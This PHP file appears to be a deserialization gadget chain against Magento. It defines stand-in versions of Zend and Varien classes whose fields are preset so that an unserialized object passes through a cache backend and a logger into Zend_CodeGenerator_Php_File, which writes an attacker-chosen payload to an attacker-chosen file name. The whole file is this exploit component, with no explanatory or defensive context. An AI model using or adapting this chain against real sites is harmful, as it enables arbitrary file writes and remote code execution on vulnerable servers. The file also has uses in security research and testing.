<?php

class Zend_Memory_Manager {
    private $_backend;

    function __construct($file, $payload) {
        $this->_backend = new Varien_Cache_Backend_Eaccelerator(
            new Zend_Log (
                new Zend_CodeGenerator_Php_File($file, $payload)
            )
        );
    }
}

class Varien_Cache_Backend_Eaccelerator {
    protected $_directives;

    function __construct($x) {
        $this->_directives = array();
        $this->_directives["logging"] = true;
        $this->_directives["logger"] = $x;
    }
}

class Zend_Log {
    protected $_writers;
    protected $_priorities;

    function __construct($writer) {
        $this->_writers = array();
        $this->_writers[0] = $writer;

        $this->_priorities = array();
        $this->_priorities[3] = 1;
        $this->_priorities[4] = 1;
    }
}

class Zend_CodeGenerator_Php_File   {
    protected $_filename;
    protected $_sourceContent;
    protected $_isSourceDirty;

    function __construct($fn, $payload) {
        $this->_filename= $fn;
        $this->_sourceContent = $payload;
        $this->_isSourceDirty = false;
    }
}
